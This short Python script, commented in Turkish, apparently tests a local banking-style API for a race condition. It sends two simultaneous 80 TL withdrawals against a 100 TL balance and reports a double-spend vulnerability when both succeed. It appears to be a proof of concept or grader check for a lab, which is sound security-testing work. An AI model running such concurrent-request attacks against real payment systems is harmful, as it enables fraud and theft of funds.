import sys
import threading
import requests

def send_withdraw(port, amount, results):
    try:
        res = requests.post(
            f"http://127.0.0.1:{port}/api/withdraw",
            json={"amount": amount},
            timeout=5
        )
        results.append((res.status_code, res.json()))
    except Exception as e:
        results.append((500, str(e)))

def run_race(port):
    # Hesap başlangıç bakiyesi: 100 TL
    # 2 adet eşzamanlı 80 TL çekim isteği gönderiyoruz.
    # Beklenen meşru davranış: Biri başarılı (200), diğeri yetersiz bakiye (400) olmalı.
    # Toplam çekilen miktar 80 TL kalmalı, bakiye 20 TL olmalı.
    results = []
    t1 = threading.Thread(target=send_withdraw, args=(port, 80, results)) # İlk istek
    t2 = threading.Thread(target=send_withdraw, args=(port, 80, results)) # İkinci istek

    t1.start() # Başlat
    t2.start() # ikinci isteği başlat
    t1.join() # ilk isteğin bitmesini bekle
    t2.join() # ikinci isteğin bitmesini bekle

    # Son bakiyeyi sorgula
    bal_res = requests.get(f"http://127.0.0.1:{port}/api/balance").json()  
    final_balance = bal_res.get("balance")
    # final balance 20 TL olmalı, eğer 0 TL ise çifte harcama başarılı olmuş demektir.

    success_count = sum(1 for status, body in results if status == 200) # Kaç tane başarılı işlem olduğunu say

    print(f"Port {port} -> Başarılı İşlem Sayısı: {success_count}/2, Kalan Bakiye: {final_balance}")
    for status, body in results:
        print(f"  Yanıt ({status}): {body}")

    # Exploit  olduysa toplam 160 TL çekilmiş ve 100 TL sınır çiğnenmiştir.tespiti: İki işlem de başarılı
    if success_count == 2:
        return True # Çifte harcama başarılı (Zafiyet var)
    return False

if __name__ == '__main__':
    target_port = sys.argv[1]
    is_exploited = run_race(target_port)
    sys.exit(0 if is_exploited else 1)
